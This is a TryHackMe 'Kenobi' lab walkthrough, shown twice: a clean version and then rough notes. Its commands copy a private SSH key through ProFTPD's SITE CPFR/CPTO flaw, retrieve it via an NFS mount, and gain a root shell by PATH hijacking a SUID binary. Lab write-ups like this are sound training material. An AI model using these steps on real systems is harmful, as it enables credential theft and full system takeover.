# Kenobi

## [Kenobi on TryHackMe](https://tryhackme.com/room/kenobi)

## Overview

* **Difficulty:** Easy
* **Category:** Enumeration / SMB / NFS / Privilege Escalation
* **Skills Practiced:** Network enumeration, SMB share enumeration, NFS mounting, ProFTPD exploitation, SSH key extraction, SUID privilege escalation

## Tools & Techniques

* `nmap` – for port scanning and service enumeration
* `smbclient` – for enumerating and accessing SMB shares
* Nmap NSE scripts – for SMB and NFS enumeration
* `nc` (Netcat) – for interacting with the FTP service
* `searchsploit` – for finding public exploits
* `mount` – for mounting NFS shares
* `ssh` – for accessing the target using the extracted SSH key
* `find` – for locating SUID binaries
* PATH Hijacking – for privilege escalation

## Walkthrough (Step-by-Step)

### 1. Deployment & Setup

* Start the **Kenobi** machine on TryHackMe.
* Run an initial Nmap scan to identify open ports and services.

```bash
nmap -vvv <target-ip>
```

**Findings:**

```
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
111/tcp  open  rpcbind      syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
2049/tcp open  nfs          syn-ack ttl 62
```

The scan reveals several interesting services, including **FTP**, **SMB**, **RPC**, and **NFS**.

### 2. Enumerating SMB Shares

Since SMB is available, enumerate the available shares.

1. Use the Nmap SMB enumeration scripts:

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target-ip>
```

2. List the available SMB shares:

```bash
smbclient -L //<target-ip> -N
```

Review the available shares and identify any accessible ones.

3. Connect to the anonymous share:

```bash
smbclient //<target-ip>/anonymous -N
```

4. Browse the contents to gather additional information about the target.

### 3. Enumerating the NFS Share

The initial Nmap scan showed **rpcbind** running on port **111**, indicating that NFS may be available.

Use the Nmap NSE scripts to enumerate exported NFS shares.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target-ip>
```

**Findings:**

The scan reveals the directory that can be mounted remotely.

### 4. Enumerating the FTP Service

Determine the version of **ProFTPD** running on the target.

1. Connect using Netcat:

```bash
nc <target-ip> 21
```

The FTP banner displays the ProFTPD version.

2. Search for available exploits:

```bash
searchsploit proftpd <version>
```

Review the available exploits for the detected version.

### 5. Exploiting ProFTPD

The vulnerable ProFTPD version allows files to be copied using the `SITE CPFR` and `SITE CPTO` commands.

1. Connect to the FTP service using Netcat.

2. Copy Kenobi's private SSH key.

* First, specify the source file:

```text
SITE CPFR /home/kenobi/.ssh/id_rsa
```

**Result:**

```
350 File or directory exists, ready for destination name.
```

* Next, copy the file into the NFS share:

```text
SITE CPTO /var/tmp/id_rsa
```

**Result:**

```
250 Copy successful.
```

The SSH private key has now been copied to an accessible location.

### 6. Mounting the NFS Share

1. Create a local mount point:

```bash
mkdir /mnt/kenobiNFS
```

2. Mount the exported NFS share:

```bash
mount <target-ip>:/var /mnt/kenobiNFS
```

> **Note:** Ensure you have sufficient permissions to mount the share.

3. Verify the mounted directory:

```bash
ls -la /mnt/kenobiNFS
```

The copied `id_rsa` file should now be accessible.

### 7. Gaining SSH Access

1. Use the extracted private key to authenticate as **kenobi**.

```bash
ssh -i id_rsa kenobi@<target-ip>
```

2. Once connected, navigate to Kenobi's home directory and retrieve the user flag.

### 8. Privilege Escalation

1. Enumerate SUID binaries:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Review the results and identify the vulnerable binary.

2. During execution, notice that it calls:

```bash
curl -I
```

Since the binary executes `curl` without an absolute path, it is vulnerable to **PATH Hijacking**.

3. Create a malicious replacement for `curl`:

```bash
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl
```

4. Modify the PATH environment variable:

```bash
PATH=/tmp:$PATH
```

5. Run the vulnerable SUID binary again.

**Result:**

A root shell is spawned.

6. Navigate to the root directory and retrieve the final flag.

```bash
cd /root
cat root.txt
```
































https://tryhackme.com/room/kenobi

deploy the machine

run the nmap scan 

```bash
nmap -vvv <target-ip>
```

PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 62
22/tcp   open  ssh          syn-ack ttl 62
80/tcp   open  http         syn-ack ttl 62
111/tcp  open  rpcbind      syn-ack ttl 62
139/tcp  open  netbios-ssn  syn-ack ttl 62
445/tcp  open  microsoft-ds syn-ack ttl 62
2049/tcp open  nfs          syn-ack ttl 62

now let't try to enumerate a machine for SMB shares

```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target-ip>
```

```bash
smbclient -L //<target-ip> -N
```

and check how many shares are there.

then connect to one of the share

```bash
smbclient //<target-ip>/anonymous -N
```

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <target-ip>
```

and find to which dir we can mount

now try to find verion of ProFtpd, use nc

```bash
nc <target-ip> <port>
```

to find how many vulnarabilities are in this verion run:

```bash
searchsploit proftpd <version>
```

now to exploit it.

open netcat tab

type

```bash
SITE CPFR /home/kenobi/.ssh/id_rsa
```

response is ok. File is found.

now try to copy it to /var/tmp/id_rsa

```bash
SITE CPTO /var/tmp/id_rsa
```

success. File is copied.

now mount it to our machine.

```bash
mkdir /mnt/kenobiNFS
mount 10.113.143.229:/var /mnt/kenobiNFS
```

> ensure yyou have permission

ensure the existance of mounted directory
```bash
ls -la /mnt/kenobiNFS
```

now try to connect with ssh using this

```bash
ssh -i id_rsa kenobi@<target-ip>
```

then find user.txt file in user's home.

use 

```bash
find / -perm -u=s -type f 2>/dev/nul
```

to find the file with suid permission

then run this command.

we see that the status check call `curl -I`

lets change the behavier of curl

```bash
echo /bin/sh > /tmp/curl
chmod 777 /tmp/curl
PATH=/tmp:$PATH
```

now try to run the same command and check status

and find the root.txt in root's home
